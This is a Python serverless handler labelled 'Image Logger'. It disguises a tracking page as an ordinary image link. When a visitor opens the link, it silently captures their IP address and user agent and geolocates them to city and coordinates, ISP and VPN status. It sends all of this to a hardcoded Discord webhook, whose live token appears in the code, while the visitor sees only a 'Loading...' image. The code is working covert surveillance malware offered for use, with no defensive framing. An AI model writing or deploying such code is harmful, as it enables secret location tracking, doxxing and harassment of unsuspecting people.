from httpagentparser import simple_detect
import requests

def handler(request):
    ip = request.headers.get("x-forwarded-for", "unknown")
    ua = request.headers.get("user-agent", "unknown")

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    os, browser = simple_detect(ua)

    webhook_url = "https://discord.com/api/webhooks/1392237664173821992/eALBCASflu7ORW3tTSGzsTlYt7eb_TFY-dTZE4ZAz6hohPkdMWNq2GZ4C2BiHUQnD0Bh"
    image_url = "https://photospace.life/TUHPWY"

    embed = {
        "username": "Image Logger",
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": 0x00FFFF,
            "thumbnail": {"url": image_url},
            "description": f"""**A User Opened the Image!**

**IP:** `{ip}`
**ISP:** `{info.get('isp', 'Unknown')}`
**ASN:** `{info.get('as', 'Unknown')}`
**Country:** `{info.get('country', 'Unknown')}`
**Region:** `{info.get('regionName', 'Unknown')}`
**City:** `{info.get('city', 'Unknown')}`
**Coords:** `{info.get('lat', '?')}, {info.get('lon', '?')}`
**Timezone:** `{info.get('timezone', 'Unknown')}`
**Mobile:** `{info.get('mobile', '?')}`
**VPN:** `{info.get('proxy', '?')}`
**Bot/Hosting:** `{info.get('hosting', '?')}`
**OS:** `{os}`
**Browser:** `{browser}`

**User-Agent:""" 
        }]
    }

    try:
        requests.post(webhook_url, json=embed)
    except:
        pass

    html = f"""
    <html>
    <head><meta charset="utf-8"><title>Loading...</title></head>
    <body style="margin:0;padding:0;background:#000;">
        <img src="{image_url}" style="width:100vw;height:100vh;object-fit:contain;" />
    </body>
    </html>
    """

    return {
        "statusCode": 200,
        "headers": {"Content-Type": "text/html"},
        "body": html
    }
